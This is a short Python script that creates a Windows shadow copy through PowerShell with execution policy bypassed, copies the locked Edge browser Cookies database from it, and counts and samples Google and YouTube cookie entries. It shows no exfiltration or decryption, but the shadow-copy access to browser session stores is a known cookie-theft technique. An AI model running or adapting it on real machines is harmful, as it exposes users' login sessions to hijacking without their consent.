import sqlite3, subprocess, os
from pathlib import Path

TMP = Path(os.environ['TEMP']) / 'ck_check.db'
USERNAME = os.environ['USERNAME']
cookie_rel = f"Users\\{USERNAME}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"

ps = f"""
$s = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\\\\", "ClientAccessible")
$dev = (Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate | Select-Object -Last 1).DeviceObject
Copy-Item "$dev\\{cookie_rel}" "{TMP}" -Force
"""
r = subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-Command', ps], capture_output=True, text=True)
print("PS stderr:", r.stderr[:200] if r.stderr else "none")

if TMP.exists():
    conn = sqlite3.connect(str(TMP))
    total = conn.execute("SELECT count(*) FROM cookies").fetchone()[0]
    google = conn.execute("SELECT count(*) FROM cookies WHERE host_key LIKE '%.google.com' OR host_key LIKE '%.youtube.com'").fetchone()[0]
    sample = conn.execute("SELECT host_key, name, length(value), length(encrypted_value) FROM cookies WHERE host_key LIKE '%.google.com' LIMIT 5").fetchall()
    conn.close()
    TMP.unlink()
    print(f"Total cookies: {total}, Google/YT: {google}")
    print("Sample:", sample)
else:
    print("File not copied")
